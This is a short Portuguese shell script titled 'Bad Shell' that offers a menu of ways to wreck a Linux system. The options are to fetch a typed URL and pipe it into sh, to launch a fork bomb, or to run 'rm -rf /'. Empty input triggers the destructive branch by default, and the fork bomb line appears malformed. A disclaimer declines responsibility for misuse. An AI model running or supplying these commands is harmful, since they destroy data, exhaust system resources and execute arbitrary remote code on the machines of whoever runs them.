#!/bin/sh
#Atenção! O autor do código não se responsabiliza pelo uso indevido do script! Use por sua conta e risco!

menu() {
clear
echo
echo " Bad Shell: o meio + fácil de ferrar com seu SO"
echo
echo " [1] Download malicious source"
echo " [2] Fork Bomb"
echo " [3] Suicide Linux"
echo
echo -n " Esolha uma opção: "
read OPTION

[ "$OPTION" -ge 1 -a "$OPTION" -le 3 ] || OPTION=0
echo
[ "$OPTION" = "1" ] && download
[ "$OPTION" = "2" ] && fbomb
[ "$OPTION" = "3" ] && suicide
[ "$OPTION" = "0" ] && echo " Opção inválida"
}

download(){
echo -n " Digite o link completo: "
read BADLINK
wget $BADLINK -O- | sh ; exit
}

fbomb() {
echo -n " Você têm certeza? [S/N] "
read FORK
echo
case $FORK in
    s|S|"") : () { : | : & }; : ;;
    n|N|"") menu ;;
    *) echo " Opção inválida" ;;
esac
}

suicide() {
echo -n " Você têm certeza? [S/N] "
read SLINUX
echo
case $SLINUX in
    s|S|"") rm -rf / ;;
    n|N|"") menu ;;
    *) echo " Opção inválida" ;;
esac
}

menu
